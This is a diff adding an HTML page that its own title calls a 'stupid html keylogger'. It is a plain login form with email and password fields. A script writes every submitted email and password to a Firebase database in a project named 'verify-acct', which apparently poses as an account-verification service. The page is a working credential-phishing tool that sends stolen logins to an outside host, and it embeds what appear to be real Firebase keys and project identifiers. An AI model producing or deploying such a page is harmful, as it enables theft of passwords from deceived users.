@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+         <meta charset="UTF-8">
+         <meta http-equiv="X-UA-Compatible" content="IE-edge">
+         <meta name="viewport"content="width=device-width, initial-scale=1.0">
+         <title>Firing up my stupid html keylogger</title>
+
+    </head>
+
+    <body>
+
+        <label>Username</label> <input id="Username" type="email">
+        <label>Password</label> <input id="Password" type="password">
+        <hr>
+
+        <button id="Submit">Submit</button>
+
+        <script type="module">
+            // Import the functions you need from the SDKs you need
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
+            // TODO: Add SDKs for Firebase products that you want to use
+            // https://firebase.google.com/docs/web/setup#available-libraries
+          
+            // Your web app's Firebase configuration
+            const firebaseConfig = {
+              apiKey: "AIzaSyDUCpkxi9HmWtx2xwX_CexCCpu-jHukUOA",
+              authDomain: "verify-acct.firebaseapp.com",
+              databaseURL: "https://verify-acct-default-rtdb.firebaseio.com",
+              projectId: "verify-acct",
+              storageBucket: "verify-acct.appspot.com",
+              messagingSenderId: "954986647327",
+              appId: "1:954986647327:web:fb6c57be21f1af22ab6a2a"
+            };
+          
+            // Initialize Firebase
+            const app = initializeApp(firebaseConfig);
+          
+            import {getDatabase,ref,set,child,update,remove}
+            from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
+            const db = getDatabase();
+          
+            var username = document.getElementById("Username");
+            var password = document.getElementById("Password");
+          
+            var submit = document.getElementById("Submit"); 
+          
+          
+          //inserting my data function for the so called keylogger//
+            
+            function InsertData(){
+                set(ref(db, "Users/"+username.value),{
+          
+                  Email: username.value,
+                  Password: password.value
+          
+                })
+                .then(()=>{
+                  alert("Sucess");
+          
+                })
+                .catch((error)=>{
+                  alert("Wrong username or password");
+          
+                });
+            }
+            submit.addEventListener('click',InsertData);
+          </script>
+    </body>
+</html>
